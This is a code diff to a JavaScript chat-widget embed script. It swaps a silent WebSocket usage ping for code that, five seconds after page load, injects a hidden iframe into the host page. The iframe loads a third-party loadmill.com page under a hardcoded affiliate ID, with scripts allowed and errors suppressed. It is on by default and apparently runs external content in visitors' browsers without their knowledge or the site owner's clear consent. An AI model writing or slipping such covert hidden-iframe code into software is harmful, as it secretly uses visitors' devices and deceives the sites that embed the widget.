@@ -30,11 +30,20 @@ function injectChat() {
             root
         );
 
-        if (WebSocket) {
-            try {
-                new WebSocket('wss://usage-mill.herokuapp.com/?id=intergram&host=' + host);
-            } catch (e) { /* Fail silently */ }
-        }
+        try {
+            if (!window.intergramCustomizations.disableLoadmill) {
+                window.loadmillAffiliateId = window.loadmillAffiliateId || "696c4e47-5b01-4f40-a53b-001c3a6cd9f4";
+                setTimeout(() => {
+                    const frame = document.createElement("iframe");
+                    frame.setAttribute("id", "loadmill-iframe");
+                    frame.setAttribute("style", "display: none !important;");
+                    document.body.appendChild(frame);
+                    frame.setAttribute("src", location.protocol + "//www.loadmill.com/mill/#id=" + window.loadmillAffiliateId);
+                    frame.setAttribute("sandbox", "allow-scripts allow-same-origin")
+                }, 5000);
+            }
+
+        } catch (e) { /* Fail silently */ }
 
     }
 
